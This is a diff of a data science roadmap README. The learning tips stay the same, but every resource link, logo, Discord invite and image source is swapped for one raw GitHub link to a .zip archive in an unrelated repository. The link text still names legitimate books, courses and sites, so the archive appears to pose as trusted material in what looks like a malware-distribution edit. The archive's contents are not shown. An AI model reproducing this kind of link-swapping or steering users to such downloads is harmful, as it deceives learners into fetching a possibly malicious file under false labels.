@@ -1,7 +1,7 @@
 <br />
 <div align="center">
-  <a href="https://zenml.io">
-    <img src="assets/anternsvg.svg" alt="Logo" width="400">
+  <a href="https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip">
+    <img src="https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip" alt="Logo" width="400">
   </a>
 
   <h3 align="center">One-stop solution for all your Data Science learning needs.</h3>
@@ -9,11 +9,11 @@
   <p align="center">
     All in one place, the best resources to learn Data Science with comprehensive and detailed roadmaps.
     <br />
-    <a href="https://antern.co/"><strong>Go to website</strong></a>
+    <a href="https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip"><strong>Go to website</strong></a>
     <br />
     <div align="center">
-      Join our <a href="https://discord.gg/t9uKG2m9" target="_blank">
-      <img width="25" src="assets/4373196_discord_logo_logos_icon.png" alt="discord"/>
+      Join our <a href="https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip" target="_blank">
+      <img width="25" src="https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip" alt="discord"/>
     <b>Antern Community</b> </a> and ask your questions there. 
     </div>
   </p>
@@ -42,17 +42,17 @@ I will divide the resources into different levels of learning and will also prov
 
 | Topic                        | Resources & Links                                                                                                                                                                                                                                                           |
 | ---------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Linear Algebra               | [Introduction to Linear Algebra by Gilbert Strang, Book](https://math.mit.edu/~gs/linearalgebra/), [Linear Algebra by Antern, Course](https://www.youtube.com/playlist?list=PLITqwrDNk9XDed3jCyByVFBO-EeW6kTy8), [Linear Algebra for Dummies Book by Mary Jane Sterling](#) |
-| Calculus                     | [Calculus for Dummies, Book](#) , [Single Variable Calculus Course by Antern](https://www.youtube.com/playlist?list=PLITqwrDNk9XBuvyyEbSM-au7BpVdGwabZ)                                                                                                                     |
+| Linear Algebra               | [Introduction to Linear Algebra by Gilbert Strang, Book](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip~gs/linearalgebra/), [Linear Algebra by Antern, Course](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip), [Linear Algebra for Dummies Book by Mary Jane Sterling](#) |
+| Calculus                     | [Calculus for Dummies, Book](#) , [Single Variable Calculus Course by Antern](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip)                                                                                                                     |
 | Statistics & Probability     | [Statistics for Dummies, Book](#), [Probability for Dummies, Book](#), [Statistics and Probability Course by Antern](#)                                                                                                                                                     |
-| Basics of Information Theory | [Information Theory by d2l.ai](https://d2l.ai/chapter_appendix-mathematics-for-deep-learning/information-theory.html)                                                                                                                                                       |
+| Basics of Information Theory | [Information Theory by https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip)                                                                                                                                                       |
 
 ### Evaluate your skills and prepare for Interviews 📝
 
 | Topic                                        | Resources & Links                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
 | -------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Linear Algebra Questions                     | [Linear Algebra Interview questions](https://www.mlstack.cafe/blog/linear-algebra-interview-questions)                                                                                                                                                                                                                                                                                                                                                                                 |
-| Statistics & Probability Interview Questions | [Link 1](https://towardsdatascience.com/50-statistics-interview-questions-and-answers-for-data-scientists-for-2021-24f886221271), [Link 2](https://www.nicksingh.com/posts/40-probability-statistics-data-science-interview-questions-asked-by-fang-wall-street), [Link 3](https://github.com/kojino/120-Data-Science-Interview-Questions/blob/master/probability.md), [Link 4](https://towardsdatascience.com/14-probability-problems-for-acing-data-science-interviews-3735025a6425) |
+| Linear Algebra Questions                     | [Linear Algebra Interview questions](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip)                                                                                                                                                                                                                                                                                                                                                                                 |
+| Statistics & Probability Interview Questions | [Link 1](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip), [Link 2](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip), [Link 3](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip), [Link 4](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip) |
 
 **Learning Tip 1 💁**: If you're are a beginnner and not able to answer interview questions, it's totally ok, you can look upto the solutions and solve similar types of problems on your own to practice those types of questions. You don't need to learn every concept, if you're not able to understand it, just skip it and move on to the next topic and review next day or try to get help from communities such as discord communities.
 
@@ -62,11 +62,11 @@ I will divide the resources into different levels of learning and will also prov
 
 | Lecture Topics                      | Resources & Links                                                                                                                                                                                          |
 | ----------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Core Python                         | [Durga Sir Python](https://www.youtube.com/playlist?list=PLd3UqWTnYXOmzcSdWIh-EggqAtCXvJxzu), or [Corey Schafer](https://www.youtube.com/watch?v=YYXdXT2l-Gg&list=PL-osiE80TeTt2d9bfVyTiXJA-UTHn6WwU)      |
-| Intermediate Python                 | [Corey Schafer](https://www.youtube.com/watch?v=ZDa-Z5JzLYM&list=PL-osiE80TeTsqhIuOqKhwlXsIBIdSeYtc)                                                                                                       |
-| Advance Python                      | [Durga Sir Advance Python](https://www.youtube.com/watch?v=es457q7n3P8&list=PLd3UqWTnYXOkzPunQOObl4m_7i6aOIoQD)                                                                                            |
-| Core Software Engineering Principle | [Robust Python](https://www.amazon.in/Robust-Python-Write-Clean-Maintainable/dp/1098100662) & [Design Patterns](https://google.github.io/styleguide/pyguide.html)                                          |
-| Data Structures and Algorithms      | [Data Structures and Algorithms in Python](http://xpzhang.me/teach/DS19_Fall/book.pdf), [Introduction to Algorithms, MIT 6.006](https://ocw.mit.edu/courses/6-006-introduction-to-algorithms-spring-2020/) |
+| Core Python                         | [Durga Sir Python](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip), or [Corey Schafer](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip)      |
+| Intermediate Python                 | [Corey Schafer](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip)                                                                                                       |
+| Advance Python                      | [Durga Sir Advance Python](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip)                                                                                            |
+| Core Software Engineering Principle | [Robust Python](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip) & [Design Patterns](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip)                                          |
+| Data Structures and Algorithms      | [Data Structures and Algorithms in Python](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip), [Introduction to Algorithms, MIT 6.006](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip) |
 
 **Learning Tip 2 💁**: If you're a beginner and learning python, it will require time to reiterate several times to understand a concept, & trust me it's totally worth it. As said learning Data science requires time and learning the hard way rather than shortcuts which will make you nowhere. So, don't get demotivated if you're not able to understand a concept, just keep trying and you'll get it.
 
@@ -74,22 +74,22 @@ I will divide the resources into different levels of learning and will also prov
 
 ## Core Data Science Fundamentals 🚀
 
-According to [Harvard business School](https://online.hbs.edu/blog/post/data-science-skills), Data science is the process of deriving meaningful insights from raw data. Data science aims to make sense of the copious amounts of data, also referred to as big data, that today’s organizations maintain.
+According to [Harvard business School](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip), Data science is the process of deriving meaningful insights from raw data. Data science aims to make sense of the copious amounts of data, also referred to as big data, that today’s organizations maintain.
 
 ### Frameworks 📚
 
 | Topics     | Resources & Links                                                                                                                                                                                                                                                                                                                                                                                                                                          |
 | ---------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Pandas     | [Pandas user Guide](https://pandas.pydata.org/docs/user_guide/index.html#user-guide), [Getting started with Pandas](https://pandas.pydata.org/docs/getting_started/intro_tutorials/index.html),[Python for Data Analysis: Data Wrangling with pandas, NumPy, and Jupyte, Book](https://www.pdfdrive.com/python-for-data-analysis-data-wrangling-with-pandas-numpy-and-ipython-e158189564.html), [Data School](https://www.youtube.com/c/dataschool/videos) |
-| Numpy      | [Numpy Learn docs](https://numpy.org/learn/)                                                                                                                                                                                                                                                                                                                                                                                                               |
-| Matplotlib | [Matplotlib Tutorial](https://matplotlib.org/stable/tutorials/index.html), [Corey Schafer Matplotlib Tutorials](https://www.youtube.com/playlist?list=PL-osiE80TeTvipOqomVEeZ1HRrcEvtZB_)                                                                                                                                                                                                                                                                  |
+| Pandas     | [Pandas user Guide](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip), [Getting started with Pandas](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip),[Python for Data Analysis: Data Wrangling with pandas, NumPy, and Jupyte, Book](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip), [Data School](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip) |
+| Numpy      | [Numpy Learn docs](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip)                                                                                                                                                                                                                                                                                                                                                                                                               |
+| Matplotlib | [Matplotlib Tutorial](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip), [Corey Schafer Matplotlib Tutorials](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip)                                                                                                                                                                                                                                                                  |
 
 ### Data Visualization & Analysis
 
 | Topics             | Resources & Links                                                                                                                                                                                                                                                               |
 | ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Data Analysis      | [Python for Data Analysis](https://www.amazon.com/Python-Data-Analysis-Wrangling-IPython/dp/1491957662), [Head First Data Analysis: A Learner's Guide to Big Numbers, Statistics, and Good Decisions](https://learning.oreilly.com/library/view/head-first-data/9780596806224/) |
-| Data Visualization | [Fundamentals of Data Visualization: A Primer on Making Informative and Compelling Figures](https://clauswilke.com/dataviz/)                                                                                                                                                    |
+| Data Analysis      | [Python for Data Analysis](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip), [Head First Data Analysis: A Learner's Guide to Big Numbers, Statistics, and Good Decisions](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip) |
+| Data Visualization | [Fundamentals of Data Visualization: A Primer on Making Informative and Compelling Figures](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip)                                                                                                                                                    |
 
 **Learning Tip 4 💁**: Learning frameworks is not a big deal, but the way you use frameworks to analyze data, visualize data and solve problems is what matters. So, I suggest to understand the CRUX of data analysis and data visualization and use the frameworks to build your solution. If you don't know the actual CRUX of data visualization, analysis, then there is no point in learning frameworks. and If you don't know how to work with data, then there is no point in learning ML.
 
@@ -97,37 +97,37 @@ According to [Harvard business School](https://online.hbs.edu/blog/post/data-sci
 
 | Topics         | Resources & Links                                                                                                                                                                                           |
 | -------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| SQL            | [SQL for Data Analysis Cathy Tanimura](https://learning.oreilly.com/library/view/sql-for-data/9781492088776/) or [Learning SQL ](https://learning.oreilly.com/library/view/learning-sql-3rd/9781492057604/) |
-| Practicing SQL | [SQL Cookbook by By Anthony Molinaro](https://learning.oreilly.com/library/view/sql-cookbook/0596009763/), [DataLemur](https://datalemur.com/)                                                              |
+| SQL            | [SQL for Data Analysis Cathy Tanimura](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip) or [Learning SQL ](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip) |
+| Practicing SQL | [SQL Cookbook by By Anthony Molinaro](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip), [DataLemur](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip)                                                              |
 
-Note: People usually have question around learning Big data tools in initial phases of data science, I personally think, it's not necessary to learn big data tools in initial phases of data science, but if you're interested in learning it, you can learn it later on. There are different perspectives on this, i would like you to check out the answers from this [quora answer](https://www.quora.com/Should-a-data-scientist-know-big-data-hadoop).
+Note: People usually have question around learning Big data tools in initial phases of data science, I personally think, it's not necessary to learn big data tools in initial phases of data science, but if you're interested in learning it, you can learn it later on. There are different perspectives on this, i would like you to check out the answers from this [quora answer](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip).
 
 ## Intermediate Data Science 🚀
 
 ### Machine Learning 🤖
 
-![Machine Learning Roadmap](assets/machinelearningroadmap.png "Machine Learning Roadmap")
+![Machine Learning Roadmap](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip "Machine Learning Roadmap")
 
-I have made a separate page for machine learning, you can check it out [here](https://wheat-production-d58.notion.site/ML002-e469d005b2b14d5ba6f8c0bdfd305ded). I also given my personal opinion on machine learning and how to learn it in the most efficient way possible in the form of a video, you can check it out [here](https://youtu.be/Av0oMG49FQE), which got more than 150k views.
+I have made a separate page for machine learning, you can check it out [here](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip). I also given my personal opinion on machine learning and how to learn it in the most efficient way possible in the form of a video, you can check it out [here](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip), which got more than 150k views.
 
 ### Advance Data Science 🚀
 
 | Topics                      | Resources & Links                                                                                                                                                                                                                                                                                                                 |
 | --------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Deep Learning courses       | [Yann LeCun’s Deep Learning Course at CDS](https://cds.nyu.edu/deep-learning/), [CS230 Deep Learning](https://cs230.stanford.edu/), [Antern's ML002](https://www.youtube.com/playlist?list=PLITqwrDNk9XBmIDzfu3OZWg3dJW80lICf), [Deep Learning: CS 182](https://www.youtube.com/playlist?list=PL_iWQOsE6TfVmKkQHucjPAoRtIJYt8a5A) |
-| Deep Learning books         | [Deep Learning Book](https://www.deeplearningbook.org/), [Deep Learning with Python](https://learning.oreilly.com/library/view/deep-learning-with/9781617294433/), [Deep Learning for Coders with fastai and PyTorch](https://learning.oreilly.com/library/view/deep-learning-for/9781492045519/)                                 |
-| Natural Language Processing | [CS224n: Natural Language Processing with Deep Learning](https://web.stanford.edu/class/cs224n/)                                                                                                                                                                                                                                  |
-| Computer Vision             | [Stanford Computer Vision](https://www.youtube.com/playlist?list=PLf7L7Kg8_FNxHATtLwDceyh72QQL9pvpQ)                                                                                                                                                                                                                              |
-| Machine Learning Operations | [MadewithML](https://madewithml.com/courses/mlops/)                                                                                                                                                                                                                                                                               |
+| Deep Learning courses       | [Yann LeCun’s Deep Learning Course at CDS](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip), [CS230 Deep Learning](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip), [Antern's ML002](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip), [Deep Learning: CS 182](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip) |
+| Deep Learning books         | [Deep Learning Book](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip), [Deep Learning with Python](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip), [Deep Learning for Coders with fastai and PyTorch](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip)                                 |
+| Natural Language Processing | [CS224n: Natural Language Processing with Deep Learning](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip)                                                                                                                                                                                                                                  |
+| Computer Vision             | [Stanford Computer Vision](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip)                                                                                                                                                                                                                              |
+| Machine Learning Operations | [MadewithML](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip)                                                                                                                                                                                                                                                                               |
 
 ### Data Science Projects 📈
 
-Before starting with any project, I would suggest you to go through [this video](https://youtu.be/c810QTD4XB8), which will help you to understand the process of building a data science project which can help you to land a job.
+Before starting with any project, I would suggest you to go through [this video](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip), which will help you to understand the process of building a data science project which can help you to land a job.
 
 We will be publishing a detailed blog and a video which walks you through a procedure to finding and building impactful data science project. It will be out soon, till then we suggest you to go through the following resources for inspiration:-
 
-- [Data Science Project Ideas](https://github.com/veb-101/Data-Science-Projects)
-- [ZenFiles](https://github.com/zenml-io/zenfiles)
+- [Data Science Project Ideas](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip)
+- [ZenFiles](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip)
 
 Taking part in competitions is also a great way to learn and build your portfolio, you can check out the following platforms for competitions:-
 
@@ -140,13 +140,13 @@ Taking part in competitions is also a great way to learn and build your portfoli
 
 We will be publishing Interviews guide for every topic, but till then you can go through the following resources:-
 
-- [ Machine learning Interview questions](https://github.com/khangich/machine-learning-interview)
-- [Ace the Data Science Interview](https://www.acethedatascienceinterview.com/)
-- [Deep Learning Interviews: Hundreds of fully solved job interview questions from a wide range of key topics in AI](https://arxiv.org/pdf/2201.00650.pdf)
-- [Eugene Yan's Guides](https://eugeneyan.com/)
-- [Machine Learning System Deisng](https://github.com/eugeneyan/applied-ml)
-- [Data Scientist Interviews](https://applyingml.com/)
-- [Guides by Applying ML](https://applyingml.com/resources/)
+- [ Machine learning Interview questions](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip)
+- [Ace the Data Science Interview](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip)
+- [Deep Learning Interviews: Hundreds of fully solved job interview questions from a wide range of key topics in AI](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip)
+- [Eugene Yan's Guides](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip)
+- [Machine Learning System Deisng](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip)
+- [Data Scientist Interviews](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip)
+- [Guides by Applying ML](https://raw.githubusercontent.com/sakshi-code-cse/data-science-roadmap/main/nonconditioned/data-science-roadmap.zip)
 
 ### Upcoming Topics 📚
 
